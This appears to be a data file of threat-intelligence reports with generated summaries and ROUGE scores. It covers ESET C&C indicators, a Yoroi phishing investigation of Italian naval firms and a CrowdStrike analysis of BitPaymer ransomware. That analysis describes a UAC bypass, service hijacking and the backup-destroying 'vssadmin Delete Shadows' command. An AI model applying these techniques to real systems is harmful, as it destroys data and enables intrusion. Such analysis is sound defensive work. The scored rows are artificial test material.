B84BDB8F039B0AD9AE07E1632F72A6A5E86F37A1 Win32/Kryptik.GMKM trojan 9E111A643BACA9E2D654EEF9868D1F5A3F9AF767 Win32/Kryptik.GMKM trojanIcedIdSHA-1 ESET detection name 0618F522A7F4FE9E7FADCD4FBBECF36E045E22E3 Win32/Kryptik.GMLM trojanC&C servers (active as of November 9, 2018)187.163.174[.]149:8080 70.60.50[.]60:8080 207.255.59[.]231:443 50.21.147[.]8:8090 118.69.186[.]155:8080 216.176.21[.]143:80 5.32.65[.]50:8080 96.246.206[.]16:80 187.163.49[.]123:8090 187.207.72[.]201:443 210.2.86[.]72:8080 37.120.175[.]15:80 77.44.98[.]67:8080 49.212.135[.]76:443 216.251.1[.]1:80 189.130.50[.]85:80 159.65.76[.]245:443 192.155.90[.]90:7080 210.2.86[.]94:8080 198.199.185[.]25:443 23.254.203[.]51:8080 67.237.41[.]34:8443 148.69.94[.]166:50000 107.10.139[.]119:443 186.15.60[.]167:443 133.242.208[.]183:8080 181.229.155[.]11:80 69.198.17[.]20:8080 5.9.128[.]163:8080 104.5.49[.]54:8443 139.59.242[.]76:8080 181.27.126[.]228:990 165.227.213[.]173:8080Sign up to receive an email update whenever a new article is published in our Ukraine Crisis - Digital Security Resource Center Submit;NOPE;en;{'r': 0.0, 'p': 0.0, 'f': 0.0};{'r': 0.0, 'p': 0.0, 'f': 0.0};{'r': 0.0, 'p': 0.0, 'f': 0.0}
https://yoroi.company/research/the-martymcfly-investigation-anchors-chain-case/;The “MartyMcFly” investigation: anchors-chain case;"BackgroundOn October 17th we disclosed the ""MartyMcFly"" Threat (Rif. Analysis) where unknown attackers were targeting Italian naval industries. The analysis was cited by Kaspersky's ICS CERT who exposed a wider threat extension across multiple countries such as: Germany, Spain, and India. Thanks to Kaspersky's extended analysis we decided to harvest more indicators and to check more related threats by asking a joint cyber force with Fincantieri, one of the biggest player on Naval Industry across Europe. Fincantieri who was not involved in the previous ""MartyMcFly"" attack identified and blocked additional threats targeting their wide infrastructure intercepted on during the week of 20th August 2018, about a couple of months before the ""MartyMcFly"" campaign. Our task was to figure out if there were a correlation between those attacks targeting Italian Naval Industries and try to identify a possible attribution.Malicious EmailFincantieri's security team shared with us a copy of a malicious email, carefully themed as the ones intercepted by the Yoroi's Cyber Security Defence Center between 9th and 15th October. At first look the message appears suspicious due to inconsistent sender's domain data inside the SMTP headers:From: [email protected]Subject: Quotation on Marine Engine & TC CompleteUser-Agent: Horde Application Framework 5X-PPP-Vhost: jakconstruct.comThe email messages has been sent from a mailbox related to the ""jakconstruct.com"" domain name, which is owned by the quatari's ""AK CONSTRUCTION W.L.L."", suggesting a possible abuse of their email infrastructure.Figure 1. SMTP header smtp detailsThe ""anchors-chain.com"" domain found in the SMTP ""From"" header has been purchased a few weeks before the delivery of the malicious message: a privacy protected user registered the domain on 21 June 2018, through the ""NameSilo, LLC"" provider.Figure 2. Whois data of ""anchors-chain.com""During the time-period between the 22th of June and the 2nd of September 2018 this domain resolved to the IP address 188.241.39.10, owned by ""Fast Serv Inc."", hosting provider sometimes abused for illicit purposes (e.g. command and control services of info stealers malware). Unfortunately, the domain results offline at time of writing, so it wasn't possible to assess the presence of redirections to legit services as observer on the ""MartyMcFly"" case.Also, the ""anchors-chain.com"" domain shows an explicit reference to an asian company producing chains for a wide range of customers in the shipbuilding industry: the ""Asian Star Anchor Chain Co. Ltd."" or ""AsAc Group"". The real domain of the group spells almost the same: ""anchor-chain.com"", the letter ""s"" is the only difference between the name registered by the attacker and the legit one. Moreover the message body has been written in chinese language and the signature includes a link to another legit domain of the group, confirming the attacker was trying to impersonate personnel from AsAc Group, simulating the transmission of quotations and price lists.Figure 4. Malicious email messageAttachmentThe email message contains a pdf document named ""Marine_Engine_Spare__Parts_Order.pdf"", originally prepared from a Office document using ""Microsoft Word 2013"" and then converted into PDF format using the ""Online2PDF.com"" online service. The document does not contain any javascript or exploit code, however the single page inside the document tries to lure the victim to open up the real documenti on a so called ""Adobe Online Protection"" secure portal. The embedded link points to an external resource protected by the url shortening service ""Ow.ly"".Figure 5. Malicious PDF documentThe link ""http://ow.ly/laqJ30lt4Ou"" has been deactivated for ""spam"" issues and is no longer available at time of writing. However analyzing automated sandox report dated back to the attack time-period is possible to partially reconstruct the dynamic of the payload execution, since the click on the embedded ""ow.ly"" link.Figure 6. Attachment's process treeThe dynamic trace recorded some network activity directed to two suspicious domains on the "".usa.cc"" TLD originated right after the launch of the ""iexplore.exe"" browser's process: respectively ""wvpznpgahbtoobu.usa.cc"" and ""xtyenvunqaxqzrm.usa.cc"".Figure 7. DNS requests interceptedThe first network interaction recorded is related to the embedded link inside the pdf attachment ""http://ow.ly/laqJ30lt4Ou"", returning a redirection to another resource protected by the same URL shortening service.Figure 8. Redirection to the second ow.ly urlThe opening of the next url ""http://ow.ly/Kzr430lt4NV"" obtains another HTTP 301 redirect to a HTTPS resource related to one of the previously identified ""usa.cc"" domain:Figure 9. Redirecion to ""wvpznpgahbtoobu.usa.cc""Analyzing the SSL/TLS traffic intercepted during the dynamic analysis session shows multiple connections to the ip address 188.165.199.85, a dedicated server hosted by OVH SAS. The SSL certificate has been released by the ""cPanel, Inc"" CA and is valid since 16th August 2018, this encryption certificate is likely related to the previously discussed HTTP 301 redirection due to the common name ""CN=wvpznpgahbtoobu.usa.cc"" found in the Issuer field.Figure 10. SSL Certificate details ""wvpznpgahbtoobu.usa.cc""Another SSL/TLS connections recorded shows traffic related to the ""xtyenvunqaxqzrm.usa.cc"" domain directed to the same 188.165.199.85 ip address:Figure 11. SSL Certificate details ""xtyenvunqaxqzrm.usa.cc""OSINT investigations gathered evidence of past abuses of the ""xtyenvunqaxqzrm.usa.cc"" for malicious purposes, for instance an urlquery report dated back on 23rd August 2018 shows a phishing portal previously reachable at ""https://xtyenvunqaxqzrm .usa.cc/maesklines/Maerskline/maer.php"" contained a login page of a fake ""Maersk"" holding's shipping portal, multinational company operating in the logistic sector, one of the world's largest container shipping company.Figure 12. Phishing page previously hosted on xtyenvunqaxqzrm.usa.ccThe elements found in the dynamic execution report indicates a compatibility between the OSINT information about the ""xtyenvunqaxqzrm.usa.cc"" domain and the attachment itself: one of the dropped file recorded during the automated analysis section is named ""login.html"" and it has been classified as phishing template on the VT platform (hash 4cd270fd943448d595bfd6b0b638ad10).Figure 13. login.html page dropped during the executionConclusionThe evidences collected during the joint analysis with the Fincantieri's security team suggests some, still unspecified, targeted threat is likely trying to establish a foothold at least into the Italian naval industry. At this time is not possible to confirm the two waves of attack have been planned and executed by the same threat actor of the ""MartyMcFly"" campaign, many differences such as the distinct type of payload are relevant. However, at the same time, common elements impose to not discard the possibility of this relationship, for example the following indicators are likely suggesting correlations:impersonification of service provider and satellite companies of the naval industry sector.usage of domain names carefully selected to appear similar to legit names of known companies.usage of professional sounding emails containing reference and documents carefully aligned with impersonification context.possible usage of ""Microsoft Word 2013""Having said that we would like to thanks colleagues of Fincantieri's security team for sharing data about these attacks, helping us in the investigation of this threat.Indicator of CompromiseHere the list of indicator of compromise collected during the analysis:";"The ITSecurity report shows that unknown attackers were targeting Italian naval industries. The analysis was cited by Kaspersky's ICS CERT who exposed a wider threat extension across multiple countries such as: Germany, Spain, and India. Thanks to Kaspersky's extended analysis we decided to harvest more indicators and to check more related threats by asking a joint cyber force with Fincantieri, one of the biggest player on Naval Industry across Europe. Fincantieri who was not involved in the previous ""MartyMcFly"" attack identified and blocked additional threats targeting their wide infrastructure intercepted on during the week of 20th August 2018, about a couple of months before the ""MartyMcFly"" campaign. Our task was to figure out if there were a correlation between those attacks targeting Italian Naval Industries and try to identify a possible attribution. Malicious Email Fincantieri's security team shared with us a copy of a malicious email, carefully themed as the ones intercepted by the Yoroi's Cyber Security Defence Center between 9th and 15th October. At first look the message appears suspicious due to inconsistent sender's domain data inside the SMTP headers: From: [email protected] Subject: Quotation on Marine Engine & TC Complete UserAgent: Horde Application Framework 5XPPPVhost: jakconstruct.com The email messages has been sent from a mailbox related to the ""jakconstruct.com"" domain name, which is owned by the quatari's ""AK CONSTRUCTION W.L.L. "", suggesting a possible abuse of their email infrastructure. Figure 1. SMTP header smtp details The ""anchorschain.com"" domain found in the SMTP ""From"" header";en;{'r': 0.2866779089376054, 'p': 0.9392265193370166, 'f': 0.4392764822048288};{'r': 0.21640316205533597, 'p': 0.8975409836065574, 'f': 0.3487261115191286};{'r': 0.2866779089376054, 'p': 0.9392265193370166, 'f': 0.4392764822048288}
https://www.crowdstrike.com/blog/big-game-hunting-the-evolution-of-indrik-spider-from-dridex-wire-fraud-to-bitpaymer-targeted-ransomware/;Big Game Hunting: The Evolution of INDRIK SPIDER From Dridex Wire Fraud to BitPaymer Targeted Ransomware;"INDRIK SPIDER is a sophisticated eCrime group that has been operating Dridex since June 2014. In 2015 and 2016, Dridex was one of the most prolific eCrime banking trojans on the market and, since 2014, those efforts are thought to have netted INDRIK SPIDER millions of dollars in criminal profits. Throughout its years of operation, Dridex has received multiple updates with new modules developed and new anti-analysis features added to the malware.In August 2017, a new ransomware variant identified as BitPaymer was reported to have ransomed the U.K.'s National Health Service (NHS), with a high ransom demand of 53 BTC (approximately $200,000 USD). The targeting of an organization rather than individuals, and the high ransom demands, made BitPaymer stand out from other contemporary ransomware at the time. Though the encryption and ransom functionality of BitPaymer was not technically sophisticated, the malware contained multiple anti-analysis features that overlapped with Dridex. Later technical analysis of BitPaymer indicated that it had been developed by INDRIK SPIDER, suggesting the group had expanded its criminal operation to include ransomware as a monetization strategy.The beginning of 2017 also brought a turning point in INDRIK SPIDER's operation of Dridex. Dridex spam campaigns significantly declined, with new campaigns moving from high volume and frequency, to smaller, targeted distribution. The rapid development of Dridex also slowed during this time, with fewer versions released during 2017 than in previous years. CrowdStrike(r) Falcon(r) Intelligence(tm) also observed a strong correlation between Dridex infections and BitPaymer ransomware. During incidents that involved BitPaymer, Dridex was installed on the victim network prior to the deployment of the BitPaymer malware. Also unusual was the observation that both Dridex and BitPaymer were spread through the victim network using lateral movement techniques traditionally associated with nation-state actors and penetration testing.These new tactics of selectively targeting organizations for high ransomware payouts have signaled a shift in INDRIK SPIDER's operation with a new focus on targeted, low-volume, high-return criminal activity: a type of cybercrime operation we refer to as big game hunting. Since this shift, INDRIK SPIDER has used BitPaymer ransomware as a key vehicle for these operations, having netted around $1.5M USD in the first 15 months of ransomware operations.Targeted DeliveryFalcon Intelligence has provided support to multiple active BitPaymer incident response (IR) engagements. The information gathered from these engagements, combined with information from prior Dridex IR engagements, provides insight into how INDRIK SPIDER deploys and operates both Dridex and BitPaymer. An overview of this process is provided below in Figure 1.Figure 1. BitPaymer Ransomware Infection With DridexIn recent BitPaymer IR engagements, Falcon Intelligence linked the initial infection vector to fake updates for a FlashPlayer plugin and the Chrome web browser. These fake updates are served via legitimate websites that have been compromised, and use social engineering to trick users into downloading and running a malicious executable. These fake update campaigns appear to be a pay-per-install service that is simply used by INDRIK SPIDER to deliver its malware, as other malware has also been delivered via the same campaigns.Lateral Movement With PowerShell EmpireAfter the initial compromise, Falcon Intelligence observed both the Dridex loader and PowerShell Empire in operation on the infected host. PowerShell Empire is a post-exploitation agent built for penetration testing, which was used to move laterally between hosts. When moving between hosts, the PowerShell Empire agent was run as a service with the name Updater , as shown below in Figure 2.Figure 2. PowerShell Empire Run as a ServiceDuring this lateral movement, Falcon Intelligence also observed PowerShell Empire deploying the Mimikatz module on servers in the victim's network. Mimikatz is a post-exploitation tool used to harvest credentials from Windows hosts. These compromised credentials were then used for further lateral movement. For many of the hosts that PowerShell Empire moved to, it would download and install the Dridex loader. The lateral movement continued until the domain credentials for the environment were retrieved and both PowerShell Empire and the Dridex loader were installed on the domain controllers in the environment. This process appears to be automated based on the speed at which the hosts are compromised.Though traditionally used to load modules for fraud activity, recent updates to the Dridex loader also allow it to perform system and network reconnaissance. These reconnaissance capabilities include the ability to collect information about the current user on the host, list computers on the local network, and extract the system's environment variables. This information is likely used to assist with identifying interesting targets within the victim network.In some instances, Falcon Intelligence observed several days of inactivity between the time the domain controllers were compromised and the installation of BitPaymer. This delay may indicate that the operators were performing reconnaissance and gathering information about the victim before deciding how best to monetize the compromise.Ransomware Deployed via PowerShell Empire and GPOFalcon Intelligence has observed two different methods used to deploy BitPaymer once the domain controllers are compromised. In one instance, only the domain controllers and other critical infrastructure, like payroll servers, were targeted and PowerShell Empire was used to download and execute the BitPaymer malware directly on these servers.In another instance, the BitPaymer malware was downloaded to a network share in the victim network, and a startup script called gpupdate.bat was pushed to all the hosts on the network via Group Policy Object (GPO), from the domain controllers. This script copied BitPaymer from the share and executed it on each host in the network, encrypting thousands of machines.Big Game Hunters Use APT TacticsThis targeted deployment methodology involving credential compromise, lateral movement, and the use of system administrator tools closely mimics behavior Falcon Intelligence has observed from nation-state adversary groups, and penetration testing teams. With the move to targeting select victims for high-value payouts, the INDRIK SPIDER adversary group is no longer forced to scale its operations, and now has the capacity to tailor its tooling to the victim's environment and play a more active role in the compromise with ""hands on keyboard"" activity.BitPaymer RansomwareThough the first publicly reported use of BitPaymer was in August 2017, when the malware was linked to ransomware attacks against several NHS hospitals, it was first identified in July 2017 by Twitter user Michael Gillespie. Later, in January 2018, a report was released that identified similarities between the BitPaymer ransomware and Dridex malware. The report authors renamed the malware ""FriedEx."" Falcon Intelligence has analyzed this malware and can confirm the overlap between BitPaymer/FriedEx and Dridex malware.Due to the targeted nature of the ransomware, BitPaymer is custom-built for each operation, with a unique encryption key, a ransom note and contact information embedded in it. As a result of this customization, there are multiple builds of the malware, though Falcon Intelligence has identified two main variants: an older variant that splits the encryption process into multiple ""modes"" with each mode focused on a specific task, and a newer variant that is built to be run as a service.BitPaymer AKA ""wp_encrypt""During analysis, Falcon Intelligence obtained builds of the ransomware that contained the program database (PDB) string S:\Work\_bin\Release-Win32\wp_encrypt.pdb. Based on this string, the malware developers refer to this ransomware as wp_encrypt. The PDB string also contains the prefix string S:\Work\, which is identical to other Dridex modules, including those shown in Table 1. The ransomware also contains code from the Dridex modules, with some variants of the ransomware sharing up to 69 percent of their code with the Dridex loader.MODULE NAME DESCRIPTION loader Downloads and installs the core Dridex modules, including the worker vnc Provides remote desktop access netcheck Checks network connectivity spammer Spam module worker Core component responsible for banking trojan functionality, including keylogging, web injects, download and execute second-stage payloads, etc. trendmicro Whitelists Dridex modules from TrendMicro antivirus detection wp_decrypt BitPaymer decryption toolTable 1. Dridex Modules Sharing the Same PDB Path PrefixAnti-AnalysisBoth variants of the BitPaymer malware feature multiple techniques to hinder analysis. The malware developers have employed a combination of encrypted strings, string hashes and dynamic API resolution to ensure that no strings exist in the binary.Encrypted Strings TableThe BitPaymer malware contains a small table of encrypted strings in the rdata section of the binary. These strings use standard RC4 encryption in which the first 40 bytes form the RC4 key, and the remaining data contains the encrypted strings table. These strings are temporarily decrypted on-demand during runtime. The strings in the decrypted strings table are separated by a null byte and are referenced by their order. This string table encryption method is identical to the method used in other Dridex malware, including the 40-byte key length and the position of the table in the rdata section. The strings table includes, among other strings, the RSA public key used in the ransomware encryption, the ransom note, file extensions and the encryption target flags string.String HashesIn addition to the encrypted strings table, BitPaymer replaces the remaining strings in the binary with hashes and uses an algorithm to match these hashes with strings that exist on the host. For example, when setting the run key for persistence, instead of simply opening the registry key HKCU\Software\Microsoft\Windows\CurrentVersion\Run , BitPaymer uses the API RegEnumKeyW to iterate through all the registry keys, comparing their hash value until the correct key has been located. The hashing algorithm generates a CRC32 hash of the string, converted to lowercase. This hash is combined with a DWORD using a simple XOR. This DWORD is different for each build of the malware. This string hashing algorithm is identical to the hashing algorithm used in other Dridex modules. The hash algorithm has been replicated in Python below.import binascii def get_string_hash(string_value, key_dword):crc_hash = binascii.crc32(string_value.lowercase()) & 0xffffffffhash_value = crc_hash ^ key_dwordreturn hash_valueDynamic API ResolutionThe Windows APIs that are used in the malware are resolved dynamically at runtime. For each API, the function name and DLL name are hashed and stored in the binary. At runtime, when the API is needed, the malware will iterate through all DLLs in the Windows system directory, comparing a hash of their name with a precomputed DLL hash until it has been located. The malware will then load the DLL and iterate through the export table comparing a hash of the API name with the expected hash until it has been located. The hashing algorithm used for the API names is the same CRC32 algorithm used for the string hashes. However, when hashing the DLL names, BitPaymer converts the strings to uppercase before hashing them. This process is also used in other Dridex modules.PersistenceThe older ""mode"" variant of BitPaymer uses the Windows registry for persistence, while the newer service variant will attempt to install itself as a service. If that fails, it will fall back to using the Windows registry.Registry PersistenceThe older ""mode"" variant will first copy itself to either the %USERPROFILE%\AppData\Local or the %USERPROFILE%\AppData\LocalLow directory, depending on its process integrity level. Then it will add a new registry value to the registry key HKCU\Software\Microsoft\Windows\CurrentVersion\Run with the path to the newly copied malware. The registry value name is a randomly generated string between five and fifteen characters, containing upper and lowercase letters as well as numbers.Windows Event Viewer UAC Bypass (eventvwr.msc)When the newer service variant of BitPaymer is run, it first determines if it is being executed from an alternate data stream. If it is not executed from an alternate data stream, the malware creates a file in the %APPDATA% folder with a random file name between three and eight characters long, containing uppercase and lowercase letters as well as numbers. It then copies itself to the alternate data stream :bin of the newly created file and creates a new process from the stream.When the malware is executed from the alternate data stream, it checks the process integrity level. If it is not running with a level above medium integrity, it attempts to elevate its privileges. To suppress the User Access Control (UAC) prompt that normally occurs during privilege elevation, the malware uses a UAC bypass technique first documented in August 2016. This bypass requires temporarily setting either the registry key HKCU\Software\Classes\ms-settings\shell\open\command on Windows 10, or the registry key HKCU\Software\Classes\mscfile\shell\open\command on Windows 7 to execute the malware. Once the registry key is set, the malware launches the Windows event viewer process eventvwr.msc , which will inadvertently launch the malware set in the registry keys with elevated privileges.Hijacked Service PersistenceIf elevated privileges are not obtained, the malware falls back to using the same Windows registry run key as the older mode variant for persistence HKCU\Software\Microsoft\Windows\CurrentVersion\Run . However, if the malware is successful in elevating privileges, it begins to enumerate existing Windows services on the host that are configured to run as LocalSystem . The malware selects services that are currently not active and ignores services that launch the executables svchost.exe and lsass.exe . For each service, the malware attempts to take control of the service's executable -- first using icacls.exe with the /reset flag to reset the executable's permissions, then using takeown.exe with the /F flag to take ownership of the executable.If this is successful, the malware creates a :0 alternate data stream in the executable and copies the executable's own contents to the stream. This can be used to restore the executable later. Then the malware replaces the contents of the executable with a copy of itself and launches the service. The file modified time of the executable is also artificially changed to 00:00:00 UTC . The purpose of this time change is so the file can be identified and restored by the decryption tool.Once a service has been successfully hijacked and launched, the malware stops attempting to hijack the remaining services and exits. If there are no services matching the selection criteria, BitPaymer simply exits and no files are encryptedShadow Files RemovalBefore encryption, both variants of BitPaymer attempt to remove the backup shadow files from the host, making it impossible to restore encrypted files. This is achieved by launching the vssadmin.exe process with the following command vssadmin.exe Delete Shadows /All /Quiet .EncryptionThere is a string present in the strings table that works like a configuration flag for the encryption targets of the malware. The string may contain a combination of the letters F, R, N, and S. During the encryption process, the letters in this flag are checked to determine what drive types to encrypt. The corresponding drive types for each letter are described below in Table 2. All BitPaymer samples analyzed by Falcon Intelligence had all four flags enabled for maximum encryption.LETTER DESCRIPTION F Encrypt fixed drives R Encrypt removable drives N Encrypt network drives (mounted) S Search for network shares on the domain / workgroup and encrypt themTable 2. BitPaymer Drive Type Configuration StringNetwork Share EncryptionIn order to encrypt network shares, BitPaymer will attempt to enumerate the sessions for each user logged onto the infected host and create a new process, using the token of each user. These new processes will first spawn a net.exe processing with the view argument to gather a list of network accessible hosts. For each host, BitPaymer spawns another net.exe process with command net view <host> using the newly discovered host as a parameter. This will return a list of network shares available to the impersonated user on the host. Once a list of all available shares has been gathered, BitPaymer attempts to mount them to be encrypted.Encryption RoutineFor each drive targeted, the malware recursively iterates through all files and directories. For each file, the name and path are compared against a list of excluded filenames and two lists of excluded directory names. These exclusion lists are composed of regular expression type strings that are located in the encrypted strings table. If the file name and path do not match any regular expressions in the exclusion lists, the file is encrypted.The file encryption algorithm imports a hard-coded RSA 1024-bit public key from the encrypted strings table using CryptImportPublicKeyInfo , and for each file, generates a 128-bit RC4 key using CryptGenKey . The RC4 key is then used to encrypt the file in place. Once it is encrypted, the file is moved to a new file with the same name, and the file extension is appended with the keyword .locked .The RC4 key is exported as a SIMPLEBLOB encrypted with the RSA key and Base64-encoded. A second file is created with the same name as the encrypted file, except it is appended with the extension .readme_txt . A ransom note is written to this file, and the RSA-encrypted, Base64-encoded RC4 key is appended to this file along with the KEY: string. An example of the ransom note with the appended key is shown in Figure 3.Figure 3. BitPaymer Ransom Note with Encrypted RC4 KeyBecause the key is not appended to the encrypted file but instead written to a separate file, if the file containing the ransom note is accidentally deleted or moved to a separate directory, the encrypted file will become unrecoverable. There is some indication that this may have occurred in the past, as newer ransom notes include specific warnings about touching the readme_txt files, while older versions of the ransom notes do not. The text from a newer ransom note is provided below in Figure 4.Figure 4. Newer Version of BitPaymer Ransom NoteThe language in the ransom notes indicate that this ransomware is targeted specifically at companies, not individuals. The notes also contain a threat to leak private information that has been collected from the target if the ransom is not paid. Though there is no functionality to collect this information in the ransomware itself, the ransomware is deployed by INDRIK SPIDER in parallel with Dridex malware, and the Dridex malware contains modules that may be used to collect information from infected hosts.The use of an embedded RSA public key also indicates that each build of the ransomware binary is unique to a specific target. By design, the decryption tool needs to contain the corresponding RSA private key so if the same build is used for multiple targets, the ransom would only need to be paid once to acquire the private key, which could then be used to decrypt all the infections. Falcon Intelligence has acquired multiple decryption tools related to BitPaymer, which confirm the theory that a unique key is used for each infection.Ransom Note and Decryption ProcessInformation provided in Bitpaymer ransom notes has continued to change, with the first change coming shortly after the first identified campaign in July 2017. Initially INDRIK SPIDER provided all required information in either the ransom note or through a TOR-based payment portal, meaning the victim could make the payment with very little interaction with the actor. However, later notes removed this key information forcing the victims to email the INDRIK SPIDER campaign operator for payment and decryption details. A table of observed ransom note changes can be seen below.Table 3. BitPaymer Ransom Note ChangesBy removing the ransom demand from the note, INDRIK SPIDER can change the amount based on campaign success, which likely depends on the size of the organization and the speed of initial contact from the victim.Email Support for DecryptionUnlike many ransomware operations, which usually just require victims to make the payment and subsequently download a decryptor, INDRIK SPIDER requires the victim to engage in communication with an operator. Falcon Intelligence has had unique insight into the email dialogue between a victim and an INDRIK SPIDER operator. This dialogue has revealed details about how the adversary approaches payment negotiation with the victim, as well as the communication of decryption instructions.Initial victim communication with the INDRIK SPIDER operator, using one of the email addresses provided, results in the operator providing key pieces of information up front, such as the BTC address and the ransom amount. INDRIK SPIDER is also willing to demonstrate decryption legitimacy by offering to decrypt two test files of the victim's choice.It was made clear during communications that INDRIK SPIDER is not willing to negotiate on the ransom amount, explicitly stating that the victim can use multiple Bitcoin exchanges to obtain the number of BTC required, and the exchange rate should be calculated based on the rate posted on the cryptocurrency exchange Bittrex.Ransom demands have varied between requesting an exact USD value in BTC and an exact number of BTC, which is likely due to the continued fluctuation in the BTC-to-USD value. In communications with INDRIK SPIDER, the victim is told to use any BTC exchange from the top 10 and seek help from local information technology (IT) support companies. Of note, INDRIK SPIDER specifies the geographical location of where the victim should seek help, confirming that they know key information about the victim.Once payment has been made, INDRIK SPIDER acknowledges receipt and states that the decryptor will be ""delivered within a few hours."" Though earlier in the communication process, a one-hour time window for delivery of the decrypter is promised upon receipt of payment, the decryptor was actually delivered closer to four hours after payment. This discrepancy could be due to the difference in time zones and working hours of the INDRIK SPIDER operator.INDRIK SPIDER uses file sharing platforms to distribute the BitPaymer decryptor. In an extensive email to the victim, the INDRIK SPIDER operator provides a decryptor download link, decryptor deletion link (to be used following decryptor download) and a password. The same email also provides clear instructions on how to download and use the BitPaymer decryptor, including how to remove the malware persistence. The operator also states that they will be able to provide assistance using the same email address for a further period of time, which is usually until the end of the current work week. Interestingly, INDRIK SPIDER provides the victim with several key security recommendations to follow that may ultimately avoid further breaches (see Figure 5). The recommendations provided are not only good advice, but also provide indications of how INDRIK SPIDER breaches organizations and moves laterally until domain controller access is gained.Figure 5. BitPaymer Security RecommendationsRansom PaymentsRansom demands have varied significantly, suggesting that INDRIK SPIDER likely calculates the ransom amount based on the size and value of the victim organization. The lowest identified payment was for approximately $10,000 USD, and the highest observed was for close to $200,000 USD.BTC Address Total Received in USD 12AWdHJkwF193ud21XWGontyCJTW6A9i6p $197,596.05 1Ln9RxSRuDqqFhCTuqBPBKRMeyhVhRaUG4 $0 1BWj247jtipKr1wuFciKypeidZVwZWHCi9 $77,651.59 19aF868XPJhNqheXWgvrHPqnXpwhttf3Hw $173,315.48 14uAWnPnhtrXDB9DTBCruToawM65dUgwot $740,752.71 1PNmBWJHzJGqTUemastR7E4ccrUNASktmZ $172,793.80 1DWbPyjmbKA1NFqv3nyL47y9Vsz6WFU4Hw $192,867.22Table 4. BitPaymer BTC Addresses and Identified Payment TotalsAs of Nov. 1, 2018, Falcon Intelligence had observed a total of 185.7 BTC paid to INDRIK-SPIDER-controlled BTC addresses, with a USD total of $1,554,977 based on BTC-to-USD value at the time the ransom payment was made.How CrowdStrike Falcon(r) Prevent Stops BitPaymerThe process tree for BitPaymer, as seen by the Falcon sensor, is shown below in Figure 6. To prevent BitPaymer from encrypting files on the host, Falcon Prevent(tm) next-generation antivirus must kill the ransomware process (KX9OGR~1:BIN) prior to execution of the file encryption routines.Figure 6. BitPaymer Process TreeFalcon Prevent provides two layers of defense to protect against ransomware threats like BitPaymer: indicators of attack (IOAs) and machine learning (ML). Either one of these defenses is enough to stop the BitPaymer process before it can encrypt any files.Figure 7 below shows an example of an IOA prevention alert that is sent to the centralized Falcon console. In this case, BitPaymer's attempt to delete the backup shadow files triggered the IOA that led to the prevention of this process.Had a prevention not existed for this IOA, BitPaymer would still have been prevented with CrowdStrike Falcon(r)'s ML. Below, Figure 7 shows CrowdStrike ML detecting the BitPaymer binary as malicious.Figure 7. BitPaymer Prevented by Falcon PreventHad a prevention not existed for this IOA, BitPaymer would still have been prevented with CrowdStrike Falcon(r)'s ML capabilities. Below, Figure 8 shows CrowdStrike ML detecting the BitPaymer binary as malicious.Figure 8. BitPaymer Detected by CrowdStrike Machine LearningThe Future of INDRIK SPIDER and Big Game HuntingINDRIK SPIDER consists of experienced malware developers and operators who have likely been part of the group since the early days of Dridex operations, beginning in June 2014. The formation of the group and the modus operandi changed significantly in early 2017. Dridex operations became more targeted, resulting in less distribution and Dridex sub-botnets in operation, and BitPaymer ransomware operations began in July 2017.There is no doubt that BitPaymer ransomware operations are proving successful for this criminal group, with an average estimate take of over $200,000 USD per victim, but it is also important to remember that INDRIK SPIDER continues to operate the Dridex banking trojan. Though Dridex is still bringing in criminal revenue for the actor after almost four years of operation, targeted wire fraud operations likely require lengthy planning. Therefore, a ransomware operation provides high-value income for the actor for a lot less expenditure, both in operator and development costs.Falcon Intelligence anticipates that INDRIK SPIDER will continue to operate both Dridex and BitPaymer, with the two monetization strategies complementing each other. In scenarios where wire fraud is not as lucrative an option, INDRIK SPIDER might use ransomware to monetize the compromise instead. What is clear though, is that the low-scale, selective targeting and high payout tactics of big game hunting is proving to be a winning strategy for INDRIK SPIDER.INDRIK SPIDER isn't the only criminal actor running big game hunting operations, The first ransomware to stake a claim for big game hunting was Samas (aka SamSam), which is developed and operated by BOSS SPIDER. Since they were first identified in January 2-16, this adversary has consistently targeted large organizations for high ransom demands. In July 2017, INDRIK SPIDER joined the movement of targeted ransomware with BitPaymer. Most recently, the ransomware known as Ryuk came to market in August 2017 and has netted its operators, tracked by Falcon Intelligence as GRIM SPIDER, a significant (and immediate) profit in campaigns also targeting large organizations.Falcon Intelligence anticipates that big game hunting operations will continue to grow. The criminal actors INDRIK SPIDER, BOSS SPIDER, and GRIM SPIDER will sustain their operations in the near-term. It is also likely that other criminal actors are considering the option of running sophisticated ransomware operations. Given the tools, skilled campaign operators and malware required, it is likely there will still be only a handful of criminal groups able to do so in the near future, however, Falcon Intelligence considers this to be a growing eCrime threat.IndicatorsThe following table contains SHA256 hashes for BitPaymer samples analyzed by Falcon Intelligence.SHA256 Hash Build Time (UTC) c7f8c6e833243519cdc8dd327942d62a627fe9c0793d899448938a3f10149481 2017-10-22 07:48:04 17526923258ff290ff5ca553248b5952a65373564731a2b8a0cff10e56c293a4 2017-06-08 14:20:38 282b7a6d1648e08c02846820324d932ccc224affe94793e9d63ff46818003636 2017-06-30 09:33:52 8943356b0288b9463e96d6d0f4f24db068ea47617299071e6124028a8160db9c 2018-01-26 14:43:27The following table contains SHA256 hashes for unpacked BitPaymer decryptor samples analyzed by Falcon Intelligence.SHA256 Hash Build Time (UTC) f0e600bdca5c6a5eae155cc82aad718fe68d7571b7c106774b4c731baa01a50c 2017-06-07 15:08:59 b44e61de54b97c0492babbf8c56fad0c1f03cb2b839bad8c1c8d3bcd0591a010 2017-08-02 15:40:03 13209680c091e180ed1d9a87090be9c10876db403c40638a24b5bc893fd87587 2017-11-07 14:40:50The following table contains SHA256 hashes for Dridex samples deployed during the initial stages of a BitPaymer compromise.SHA256 Hash Build Time (UTC) 91c0c6ab8a1fe428958f33da590bdd52baec868c7011461da8a8972c3d989d42 2018-05-01 14:43:04 f1d69b69f53af9ea83fe8281e5c1745737fd42977597491f942755088c994d8e 2018-05-01 00:35:47 39e7a9b0ea00316b232b3d0f8c511498ca5b6aee95abad0c3f1275ef029a0bef 2018-02-18 12:38:40Learn More:";INDRIK SPIDER is a sophisticated eCrime group that has been operating Dridex since June 2014. In 2015 and 2016, Dridex was one of the most prolific eCrime banking trojans on the market and, since 2014, those efforts are thought to have netted INDRIK SPIDER millions of dollars in criminal profits. Throughout its years of operation, Dridex has received multiple updates with new modules developed and new antianalysis features added to the malware.In August 2017, a new ransomware variant identified as BitPaymer was reported to have ransomed the U.K.'s National Health Service (NHS), with a high ransom demand of 53 BTC (approximately $200,000 USD). The targeting of an organization rather than individuals, and the high ransom demands, made BitPaymer stand out from other contemporary ransomware at the time. Though the encryption and ransom functionality of BitPaymer was not technically 